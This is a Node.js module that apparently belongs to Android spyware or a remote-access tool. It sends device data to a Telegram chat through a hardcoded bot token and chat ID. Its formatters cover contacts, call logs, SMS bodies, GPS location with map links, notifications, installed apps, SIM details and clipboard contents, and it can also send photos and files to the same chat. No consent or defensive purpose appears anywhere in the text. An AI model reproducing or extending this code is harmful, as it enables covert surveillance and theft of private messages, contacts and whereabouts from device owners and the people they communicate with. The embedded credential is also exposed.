const https = require('https');

// Telegram Bot Config
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '6898304814:AAE__DZ15ORUFmVH69N9Zxwjvmy6CNbANj8';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '1529815801';

function sendMessage(text, parseMode = 'HTML') {
  return new Promise((resolve, reject) => {
    // Telegram message limit is 4096 chars
    if (text.length > 4000) {
      text = text.substring(0, 4000) + '\n...(truncated)';
    }

    const data = JSON.stringify({
      chat_id: CHAT_ID,
      text: text,
      parse_mode: parseMode,
      disable_web_page_preview: true
    });

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data)
      }
    };

    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        try {
          const result = JSON.parse(body);
          if (result.ok) resolve(result);
          else reject(new Error(result.description || 'Telegram API error'));
        } catch (e) {
          reject(e);
        }
      });
    });

    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

function sendPhoto(photoBase64, caption = '') {
  return new Promise((resolve, reject) => {
    // Remove data URI prefix if present
    const base64Data = photoBase64.replace(/^data:image\/\w+;base64,/, '');
    const imageBuffer = Buffer.from(base64Data, 'base64');

    const boundary = '----FormBoundary' + Date.now();
    const parts = [];

    parts.push(`--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${CHAT_ID}`);
    if (caption) {
      parts.push(`--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption.substring(0, 1024)}`);
    }
    parts.push(`--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="photo.jpg"\r\nContent-Type: image/jpeg\r\n\r\n`);

    const header = Buffer.from(parts.join('\r\n') + '\r\n');
    const footer = Buffer.from(`\r\n--${boundary}--\r\n`);
    const body = Buffer.concat([header, imageBuffer, footer]);

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${BOT_TOKEN}/sendPhoto`,
      method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'Content-Length': body.length
      }
    };

    const req = https.request(options, (res) => {
      let responseBody = '';
      res.on('data', chunk => responseBody += chunk);
      res.on('end', () => {
        try {
          const result = JSON.parse(responseBody);
          if (result.ok) resolve(result);
          else reject(new Error(result.description || 'Telegram photo error'));
        } catch (e) {
          reject(e);
        }
      });
    });

    req.on('error', reject);
    req.write(body);
    req.end();
  });
}

function sendDocument(base64Data, filename, caption = '') {
  return new Promise((resolve, reject) => {
    const cleanBase64 = base64Data.replace(/^data:[^;]+;base64,/, '');
    const fileBuffer = Buffer.from(cleanBase64, 'base64');

    const boundary = '----FormBoundary' + Date.now();
    const parts = [];

    parts.push(`--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${CHAT_ID}`);
    if (caption) {
      parts.push(`--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption.substring(0, 1024)}`);
    }
    parts.push(`--${boundary}\r\nContent-Disposition: form-data; name="document"; filename="${filename}"\r\nContent-Type: application/octet-stream\r\n\r\n`);

    const header = Buffer.from(parts.join('\r\n') + '\r\n');
    const footer = Buffer.from(`\r\n--${boundary}--\r\n`);
    const body = Buffer.concat([header, fileBuffer, footer]);

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${BOT_TOKEN}/sendDocument`,
      method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'Content-Length': body.length
      }
    };

    const req = https.request(options, (res) => {
      let responseBody = '';
      res.on('data', chunk => responseBody += chunk);
      res.on('end', () => {
        try {
          const result = JSON.parse(responseBody);
          if (result.ok) resolve(result);
          else reject(new Error(result.description || 'Telegram doc error'));
        } catch (e) {
          reject(e);
        }
      });
    });

    req.on('error', reject);
    req.write(body);
    req.end();
  });
}

// Format helpers
function formatDeviceInfo(data, deviceName) {
  return `📱 <b>Device Connected</b>\n` +
    `━━━━━━━━━━━━━━━━━━\n` +
    `📛 Name: ${deviceName || 'Unknown'}\n` +
    `📱 Model: ${data.model || '-'}\n` +
    `🏭 Manufacturer: ${data.manufacturer || '-'}\n` +
    `🤖 Android: ${data.android_version || '-'} (SDK ${data.sdk || '-'})\n` +
    `🔋 Battery: ${data.battery || '-'}% ${data.charging ? '⚡ Charging' : ''}\n` +
    `⏰ Time: ${new Date().toLocaleString()}`;
}

function formatContacts(contacts) {
  let text = `👥 <b>Contacts</b> (${contacts.length})\n━━━━━━━━━━━━━━━━━━\n`;
  contacts.forEach((c, i) => {
    text += `${i + 1}. ${c.name || 'Unknown'} - ${c.number}\n`;
  });
  return text;
}

function formatCallLog(calls) {
  let text = `📞 <b>Call Log</b> (${calls.length})\n━━━━━━━━━━━━━━━━━━\n`;
  calls.slice(0, 50).forEach((c, i) => {
    const icon = c.type === 'incoming' ? '📥' : c.type === 'outgoing' ? '📤' : '📵';
    const date = new Date(c.timestamp).toLocaleString();
    text += `${icon} ${c.name || c.number} | ${c.duration}s | ${date}\n`;
  });
  if (calls.length > 50) text += `\n... +${calls.length - 50} more`;
  return text;
}

function formatSMS(messages) {
  let text = `💬 <b>SMS Messages</b> (${messages.length})\n━━━━━━━━━━━━━━━━━━\n`;
  messages.slice(0, 30).forEach((m, i) => {
    const icon = m.type === 'received' ? '📥' : '📤';
    const date = new Date(m.timestamp).toLocaleString();
    const body = (m.body || '').substring(0, 100);
    text += `${icon} ${m.from} | ${date}\n   ${body}\n\n`;
  });
  if (messages.length > 30) text += `\n... +${messages.length - 30} more`;
  return text;
}

function formatLocation(data) {
  return `🛰️ <b>Location Update</b>\n` +
    `━━━━━━━━━━━━━━━━━━\n` +
    `📍 Lat: ${data.latitude}\n` +
    `📍 Lng: ${data.longitude}\n` +
    `🎯 Accuracy: ${Math.round(data.accuracy || 0)}m\n` +
    `🚀 Speed: ${(data.speed || 0).toFixed(1)} m/s\n` +
    `⏰ ${new Date(data.timestamp).toLocaleString()}\n` +
    `🗺️ https://maps.google.com/maps?q=${data.latitude},${data.longitude}`;
}

function formatNotification(data) {
  return `🔔 <b>Notification</b>\n` +
    `━━━━━━━━━━━━━━━━━━\n` +
    `📦 App: ${data.app || data.packageName || '-'}\n` +
    `📝 Title: ${data.title || '-'}\n` +
    `💬 Text: ${data.text || '-'}\n` +
    `⏰ ${new Date(data.timestamp || Date.now()).toLocaleString()}`;
}

function formatApps(apps) {
  let text = `💻 <b>Installed Apps</b> (${apps.length})\n━━━━━━━━━━━━━━━━━━\n`;
  const userApps = apps.filter(a => !a.system);
  userApps.slice(0, 80).forEach((a, i) => {
    text += `${i + 1}. ${a.name} (${a.version || '-'})\n`;
  });
  if (userApps.length > 80) text += `\n... +${userApps.length - 80} more user apps`;
  text += `\n\n📊 Total: ${apps.length} | User: ${userApps.length} | System: ${apps.length - userApps.length}`;
  return text;
}

function formatSimInfo(data) {
  let text = `📡 <b>SIM Info</b>\n━━━━━━━━━━━━━━━━━━\n` +
    `📶 Operator: ${data.operator || '-'}\n` +
    `📱 SIM Operator: ${data.simOperator || '-'}\n` +
    `🌍 Country: ${(data.simCountry || '-').toUpperCase()}\n` +
    `🔗 Connection: ${data.connectionType || '-'} (${data.connected ? 'Connected' : 'Disconnected'})\n`;
  if (data.simSlots) {
    data.simSlots.forEach((s, i) => {
      text += `\n📌 Slot ${i + 1}: ${s.carrier} (${s.displayName})`;
    });
  }
  return text;
}

function formatClipboard(data) {
  return `📋 <b>Clipboard</b>\n━━━━━━━━━━━━━━━━━━\n${data.text || '(empty)'}`;
}

module.exports = {
  sendMessage,
  sendPhoto,
  sendDocument,
  formatDeviceInfo,
  formatContacts,
  formatCallLog,
  formatSMS,
  formatLocation,
  formatNotification,
  formatApps,
  formatSimInfo,
  formatClipboard,
  BOT_TOKEN,
  CHAT_ID
};
